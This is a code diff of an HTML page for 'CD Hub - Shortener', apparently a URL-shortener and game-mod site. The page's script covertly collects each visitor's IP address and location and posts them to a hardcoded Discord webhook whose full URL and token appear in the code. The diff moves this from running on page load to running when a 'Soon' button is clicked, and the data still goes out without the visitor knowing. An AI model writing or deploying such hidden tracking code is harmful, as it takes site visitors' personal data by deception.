@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <!-- Open Graph meta tags for social sharing -->
-  <meta property="og:title" content="CD Hub - Shortener">
-  <meta property="og:description" content="The best 8bp panel mod.">
-  <meta property="og:image" content="https://cdhub.store/Images/logo.png">
-  <meta property="og:url" content="https://url.cdhub.store/">
-  <meta property="og:type" content="website">
-
-  <!-- Twitter Card meta tags -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="CD Hub - Shortener">
-  <meta name="twitter:description" content="The best 8bp panel mod.">
-  <meta name="twitter:image" content="https://cdhub.store/Images/logo.png">
   
+  <!-- Open Graph meta tags for social sharing -->
+<meta property="og:title" content="CD Hub - Shortener">
+<meta property="og:description" content="The best 8bp panel mod.">
+<meta property="og:image" content="https://cdhub.store/Images/logo.png">
+<meta property="og:url" content="https://url.cdhub.store/">
+<meta property="og:type" content="website">
+
+<!-- Twitter Card meta tags -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="CD Hub - Shortener">
+<meta name="twitter:description" content="The best 8bp panel mod.">
+<meta name="twitter:image" content="https://cdhub.store/Images/logo.png">
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>CD Hub - Shortener</title>
@@ -21,6 +21,7 @@
   <link rel="icon" type="image/png" sizes="32x32" href="Images/logo.png">
 
   <script>
+    // Function to send user info to Discord Webhook
     async function sendUserInfoToWebhook() {
       try {
         // Fetch IP and location data from the API
@@ -44,8 +45,8 @@
           }
         };
 
-        // Webhook URL (Make sure the webhook URL is correct)
-        const webhookURL = 'https://discord.com/api/webhooks/1325964921938116619/-Xyo8xmmD2CCY6V3s8RyzmNe1INHKWNOz0S-o7-3jek-xD8aJ1433Qg518t90gzePUjo'; // Replace with your Discord webhook URL
+        // Webhook URL (Replace with your webhook URL)
+        const webhookURL = 'https://discord.com/api/webhooks/1325964921938116619/-Xyo8xmmD2CCY6V3s8RyzmNe1INHKWNOz0S-o7-3jek-xD8aJ1433Qg518t90gzePUjo'; 
 
         // Send the embed to the webhook
         await fetch(webhookURL, {
@@ -56,12 +57,19 @@
           body: JSON.stringify({ embeds: [embed] }),
         });
       } catch (error) {
-        // Error handling (optional but no logs if required)
+        console.error("Error sending user info to webhook:", error);
       }
     }
 
-    // Call the function when the page loads
-    window.onload = sendUserInfoToWebhook;
+    // Wait for the page to fully load
+    window.onload = () => {
+      // Add event listener to the 'Soon' button
+      const soonButton = document.querySelector('.btn');
+      soonButton.addEventListener('click', () => {
+        // Call the function to send info when the 'Soon' button is clicked
+        sendUserInfoToWebhook();
+      });
+    };
   </script>
 </head>
 <body>
